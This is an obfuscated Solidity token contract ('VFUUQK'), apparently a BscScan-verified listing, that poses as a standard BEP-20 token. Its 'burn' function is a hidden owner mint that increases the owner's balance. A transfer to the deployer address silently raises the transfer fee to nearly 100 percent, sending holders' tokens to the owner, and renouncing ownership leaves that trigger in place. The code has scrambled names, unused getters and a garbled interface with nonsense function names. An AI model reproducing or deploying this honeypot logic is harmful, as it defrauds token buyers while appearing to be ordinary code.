/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity =0.5.16;
contract VFUUQK {
uint256 private  NZXCST = 1000000000000000;
address private  HMFJSM = address(0);
address private  OUOTYV = address(0);
address private  TDHPUO = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant KORDBV = 99999;
address private  RQAJDP = address(0);
uint256 private  ZXYJUD = 10000000000;
uint256 private  XCWGJT = 1000000000000000000000;
string public  symbol = "VFUUQK";
uint256 private  UBOZTV = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  UWEPUS = 100000000;
address public owner;
uint256 private  JLEPNJ = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  CARRZA = address(0);
string public  name = "VFUUQK";
uint256 private  YCXDQL = 10000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
function _getRQAJDP() private returns (address) {
return RQAJDP;
}

function _getZXYJUD() private returns (uint256) {
return ZXYJUD;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JZMWHD");
require(to != address(0), "JZMWHD");
require(amount <= balanceOf[from], "JZMWHD");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* KORDBV/JLEPNJ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TDHPUO){
JLEPNJ = KORDBV+2;
}
emit Transfer(from, to, transferAmount);
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tJZMWHD 0");
require(spender != address(0), "fJZMWHD 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getHMFJSM() private returns (address) {
return HMFJSM;
}

function _getCARRZA() private returns (address) {
return CARRZA;
}

constructor () public {
TDHPUO = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getYCXDQL() private returns (uint256) {
return YCXDQL;
}

function _getUBOZTV() private returns (uint256) {
return UBOZTV;
}

function _getNZXCST() private returns (uint256) {
return NZXCST;
}

function _getUWEPUS() private returns (uint256) {
return UWEPUS;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getOUOTYV() private returns (address) {
return OUOTYV;
}


}
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);

}


interface IUniswapV2Factorydsd {
    function allPagfhfghgirs(uint) external view returns (address pair);
    function allPaigsLength() external view returns (uint);
    function createhgkPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjhkerewPTo(address) external;
    event PairCreate(address indexed token0, address indexed token1, address pair, uint);
    function fundTodsaeqew() external view returns (address);
    function fundToadddfsdsdfd() external view returns (address);
    function getdsfjhjsdPair3(address tokenA, address tokenB) external view returns (address pair);
    function setLPjlhTrewoadd(address) external;
}